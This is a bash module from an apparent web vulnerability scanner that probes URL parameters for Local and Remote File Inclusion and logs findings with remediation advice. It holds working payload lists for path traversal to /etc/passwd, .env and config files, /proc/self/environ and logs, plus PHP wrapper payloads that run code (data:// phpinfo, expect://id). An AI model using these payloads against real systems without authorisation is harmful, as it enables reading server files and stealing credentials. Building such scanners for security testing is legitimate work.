#!/bin/bash

# LFI/RFI Testing Module
# Tests for Local File Inclusion and Remote File Inclusion vulnerabilities

source "$(dirname "${BASH_SOURCE[0]}")/../../core/logger.sh"
source "$(dirname "${BASH_SOURCE[0]}")/../../core/database.sh"

# Main LFI/RFI testing function
test_lfi_rfi() {
    local url=$1
    local project_id=$2

    log_info "Testing LFI/RFI vulnerabilities on $url"

    # Test Local File Inclusion
    test_lfi "$url" "$project_id"

    # Test Remote File Inclusion
    test_rfi "$url" "$project_id"
}

# Test Local File Inclusion
test_lfi() {
    local url=$1
    local project_id=$2

    log_info "[LFI] Testing Local File Inclusion"

    # LFI payloads for Linux/Unix
    local lfi_payloads=(
        # Basic path traversal
        "../../../../etc/passwd"
        "../../../etc/passwd"
        "../../etc/passwd"
        "../etc/passwd"
        "/etc/passwd"
        # Null byte injection (older PHP versions)
        "../../../../etc/passwd%00"
        "../../../etc/passwd%00"
        # URL encoding
        "..%2F..%2F..%2F..%2Fetc%2Fpasswd"
        "..%252F..%252F..%252F..%252Fetc%252Fpasswd"
        # Double encoding
        "..%255c..%255c..%255c..%255cetc%255cpasswd"
        # Windows
        "..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts"
        "..\\..\\..\\..\\windows\\win.ini"
        "C:\\windows\\system32\\drivers\\etc\\hosts"
        "C:\\windows\\win.ini"
        # Application files
        "../../../../var/www/html/index.php"
        "../../config.php"
        "../config.php"
        "config.php"
        ".env"
        "../../.env"
        "../../../../.env"
        # Log files
        "/var/log/apache2/access.log"
        "/var/log/apache2/error.log"
        "/var/log/nginx/access.log"
        "/var/log/nginx/error.log"
        # Proc filesystem
        "/proc/self/environ"
        "/proc/self/cmdline"
        # Filter bypass
        "....//....//....//etc/passwd"
        "..;/..;/..;/etc/passwd"
    )

    # Test each parameter
    local params=$(extract_url_parameters "$url")

    if [ -z "$params" ]; then
        # Test common parameter names
        local common_params=("file" "page" "include" "path" "document" "folder" "root" "pg" "style" "pdf" "template" "php_path" "doc")
        for param in "${common_params[@]}"; do
            test_lfi_parameter "$url" "$param" "$project_id" "${lfi_payloads[@]}"
        done
    else
        while read -r param; do
            test_lfi_parameter "$url" "$param" "$project_id" "${lfi_payloads[@]}"
        done <<< "$params"
    fi
}

# Test LFI on specific parameter
test_lfi_parameter() {
    local url=$1
    local param=$2
    local project_id=$3
    shift 3
    local payloads=("$@")

    log_debug "[LFI] Testing parameter: $param"

    for payload in "${payloads[@]}"; do
        local test_url=$(build_test_url "$url" "$param" "$payload")

        local response=$(curl -s -L --max-time 10 "$test_url" 2>/dev/null)

        # Check for Linux/Unix file signatures
        if echo "$response" | grep -qE "root:x:[0-9]+:0:|root:.*:/bin/(ba)?sh"; then
            log_critical "[LFI] Local File Inclusion found in parameter '$param' - /etc/passwd disclosed!"

            db_add_finding "$project_id" "critical" "lfi_passwd" \
                "Local File Inclusion - /etc/passwd Disclosure" \
                "URL: $test_url\nParameter: $param\nPayload: $payload\n\nSuccessfully retrieved /etc/passwd file contents.\n\nThis allows reading arbitrary files from the server filesystem." \
                "" "9.1" \
                "CRITICAL:\n1. Never use user input in file paths\n2. Use whitelist of allowed files\n3. Map user input to file IDs, not paths\n4. Disable allow_url_include in PHP\n5. Use basename() to strip path components\n6. Store files outside web root\n7. Implement proper access controls"

            save_lfi_evidence "$project_id" "$test_url" "$payload" "$response"
            return 0
        fi

        # Check for Windows file signatures
        if echo "$response" | grep -qiE "\[extensions\]|\[fonts\]|; for 16-bit app support"; then
            log_critical "[LFI] Local File Inclusion found in parameter '$param' - Windows system files disclosed!"

            db_add_finding "$project_id" "critical" "lfi_windows" \
                "Local File Inclusion - Windows System File Disclosure" \
                "URL: $test_url\nParameter: $param\nPayload: $payload\n\nSuccessfully retrieved Windows system files." \
                "" "9.1" \
                "CRITICAL:\n1. Sanitize file path inputs\n2. Use whitelist validation\n3. Implement path traversal protection\n4. Run with minimum privileges"

            save_lfi_evidence "$project_id" "$test_url" "$payload" "$response"
            return 0
        fi

        # Check for PHP files (source code disclosure)
        if echo "$response" | grep -qE "<?php|<\?=|\\\$_GET|\\\$_POST|\\\$_SERVER|function |class "; then
            log_critical "[LFI] Local File Inclusion found in parameter '$param' - Source code disclosed!"

            db_add_finding "$project_id" "high" "lfi_source" \
                "Local File Inclusion - Source Code Disclosure" \
                "URL: $test_url\nParameter: $param\nPayload: $payload\n\nSuccessfully retrieved application source code.\n\nThis may expose database credentials and business logic." \
                "" "8.6" \
                "CRITICAL:\n1. Fix file inclusion vulnerability\n2. Review disclosed code for additional vulnerabilities\n3. Change any exposed credentials\n4. Implement proper file access controls"

            save_lfi_evidence "$project_id" "$test_url" "$payload" "$response"
            return 0
        fi

        # Check for .env files
        if echo "$response" | grep -qiE "DB_PASSWORD=|API_KEY=|SECRET=|APP_KEY="; then
            log_critical "[LFI] Local File Inclusion found in parameter '$param' - .env file disclosed!"

            db_add_finding "$project_id" "critical" "lfi_env" \
                "Local File Inclusion - Environment File Disclosure" \
                "URL: $test_url\nParameter: $param\nPayload: $payload\n\nSuccessfully retrieved .env file with credentials and secrets!" \
                "" "9.8" \
                "CRITICAL - IMMEDIATE ACTION:\n1. Fix LFI vulnerability immediately\n2. Rotate ALL credentials found in .env\n3. Review access logs for evidence of exploitation\n4. Move sensitive files outside web root"

            save_lfi_evidence "$project_id" "$test_url" "$payload" "$response"
            return 0
        fi

        # Check for log file disclosure
        if echo "$response" | grep -qE "GET /|POST /|User-Agent:|Mozilla/|Apache/|nginx/"; then
            log_warn "[LFI] Log file disclosure detected in parameter '$param'"

            db_add_finding "$project_id" "medium" "lfi_logs" \
                "Local File Inclusion - Log File Disclosure" \
                "URL: $test_url\nParameter: $param\nPayload: $payload\n\nSuccessfully retrieved log files.\n\nMay contain sensitive information or enable log poisoning attacks." \
                "" "6.5" \
                "1. Fix file inclusion vulnerability\n2. Implement proper access controls on log files\n3. Monitor for log poisoning attempts\n4. Review logs for sensitive data leakage"

            save_lfi_evidence "$project_id" "$test_url" "$payload" "$response"
        fi
    done

    return 1
}

# Test Remote File Inclusion
test_rfi() {
    local url=$1
    local project_id=$2

    log_info "[RFI] Testing Remote File Inclusion"

    # Check if we can host a test file (for safer testing)
    # In production, you might want to use a controlled server

    # RFI payloads - using external indicators
    local rfi_payloads=(
        # External URL tests (safer - just checks if external URLs work)
        "http://example.com/test.txt"
        "https://example.com/test.txt"
        "//example.com/test.txt"
        # PHP wrappers that might indicate RFI capability
        "php://input"
        "php://filter/convert.base64-encode/resource=index.php"
        "data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg=="
        "expect://id"
    )

    local params=$(extract_url_parameters "$url")

    if [ -z "$params" ]; then
        local common_params=("file" "page" "include" "path" "document" "template")
        for param in "${common_params[@]}"; do
            test_rfi_parameter "$url" "$param" "$project_id" "${rfi_payloads[@]}"
        done
    else
        while read -r param; do
            test_rfi_parameter "$url" "$param" "$project_id" "${rfi_payloads[@]}"
        done <<< "$params"
    fi
}

# Test RFI on specific parameter
test_rfi_parameter() {
    local url=$1
    local param=$2
    local project_id=$3
    shift 3
    local payloads=("$@")

    log_debug "[RFI] Testing parameter: $param"

    for payload in "${payloads[@]}"; do
        local test_url=$(build_test_url "$url" "$param" "$payload")

        local response=$(curl -s -L --max-time 10 "$test_url" 2>/dev/null)

        # Check for PHP wrapper success
        if echo "$payload" | grep -q "php://filter" && echo "$response" | grep -qE "^[A-Za-z0-9+/=]+$"; then
            log_critical "[RFI] PHP wrapper exploitation detected in parameter '$param'!"

            db_add_finding "$project_id" "critical" "rfi_php_wrapper" \
                "Remote File Inclusion - PHP Wrapper Exploitation" \
                "URL: $test_url\nParameter: $param\nPayload: $payload\n\nPHP wrappers are accessible, allowing file reading and potentially code execution." \
                "" "9.5" \
                "CRITICAL:\n1. Disable allow_url_include in php.ini\n2. Disable allow_url_fopen if not needed\n3. Use whitelist validation for file paths\n4. Never use user input in include/require"

            save_lfi_evidence "$project_id" "$test_url" "$payload" "$response"
            return 0
        fi

        # Check if external URL content is included
        if echo "$payload" | grep -qE "^https?://" && [ -n "$response" ]; then
            # Try to detect if external content was actually included
            if [ ${#response} -gt 100 ]; then
                log_critical "[RFI] Remote File Inclusion detected in parameter '$param'!"

                db_add_finding "$project_id" "critical" "rfi" \
                    "Remote File Inclusion Vulnerability" \
                    "URL: $test_url\nParameter: $param\nPayload: $payload\n\nThe application includes content from external URLs, allowing arbitrary code execution." \
                    "" "10.0" \
                    "CRITICAL - IMMEDIATE ACTION:\n1. Disable allow_url_include in php.ini\n2. Disable allow_url_fopen\n3. Use strict whitelist validation\n4. Never use user input in include/require statements\n5. Audit server for compromise"

                save_lfi_evidence "$project_id" "$test_url" "$payload" "$response"
                return 0
            fi
        fi

        # Check for data:// wrapper
        if echo "$payload" | grep -q "data://" && echo "$response" | grep -qE "phpinfo|PHP Version"; then
            log_critical "[RFI] Data wrapper code execution detected in parameter '$param'!"

            db_add_finding "$project_id" "critical" "rfi_data_wrapper" \
                "Remote File Inclusion - Data Wrapper Code Execution" \
                "URL: $test_url\nParameter: $param\nPayload: $payload\n\nCode execution via data:// wrapper detected." \
                "" "10.0" \
                "CRITICAL:\n1. Disable allow_url_include immediately\n2. Patch the application\n3. Audit for compromise\n4. Review server logs"

            save_lfi_evidence "$project_id" "$test_url" "$payload" "$response"
            return 0
        fi
    done

    return 1
}

# Helper functions
build_test_url() {
    local url=$1
    local param=$2
    local value=$3
    local encoded_value=$(urlencode "$value")

    if [[ "$url" == *"?"* ]]; then
        if [[ "$url" == *"$param="* ]]; then
            echo "$url" | sed "s/\([?&]${param}=\)[^&]*/\1${encoded_value}/"
        else
            echo "${url}&${param}=${encoded_value}"
        fi
    else
        echo "${url}?${param}=${encoded_value}"
    fi
}

extract_url_parameters() {
    local url=$1
    [[ "$url" != *"?"* ]] && return 1
    echo "${url#*\?}" | tr '&' '\n' | cut -d= -f1
}

urlencode() {
    local string="$1"
    local strlen=${#string}
    local encoded=""
    local pos c o

    for (( pos=0 ; pos<strlen ; pos++ )); do
        c=${string:$pos:1}
        case "$c" in
            [-_.~a-zA-Z0-9] ) o="${c}" ;;
            * ) printf -v o '%%%02x' "'$c"
        esac
        encoded+="${o}"
    done
    echo "$encoded"
}

save_lfi_evidence() {
    local project_id=$1
    local url=$2
    local payload=$3
    local response=$4

    local evidence_dir="data/projects/${project_id}/evidence/lfi"
    mkdir -p "$evidence_dir"

    local timestamp=$(date +%Y%m%d_%H%M%S)
    cat > "${evidence_dir}/lfi_${timestamp}.txt" <<EOF
LFI/RFI Evidence
URL: $url
Payload: $payload
Captured: $(date)

Response (first 5000 chars):
${response:0:5000}
EOF
    log_debug "[LFI] Evidence saved"
}

export -f test_lfi_rfi
export -f test_lfi
export -f test_rfi
